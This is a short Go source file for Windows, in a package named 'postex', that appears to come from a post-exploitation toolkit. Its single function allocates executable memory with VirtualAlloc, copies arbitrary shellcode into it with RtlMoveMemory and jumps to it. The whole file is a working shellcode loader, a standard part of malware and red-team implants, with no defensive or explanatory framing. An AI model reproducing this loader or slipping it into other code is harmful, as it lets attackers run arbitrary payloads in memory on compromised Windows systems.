// +build windows

package postex
//Contains functions for loading and executing shellcode.

import "syscall"
import "unsafe"

func ShellcodeWindows(sc []byte) error {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory := ntdll.NewProc("RtlMoveMemory")

	const MEM_COMMIT = 0x1000
	const MEM_RESERVE = 0x2000
	const PAGE_EXECUTE_READWRITE = 0x40
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	syscall.Syscall(addr, 0, 0, 0, 0)

	return nil
}
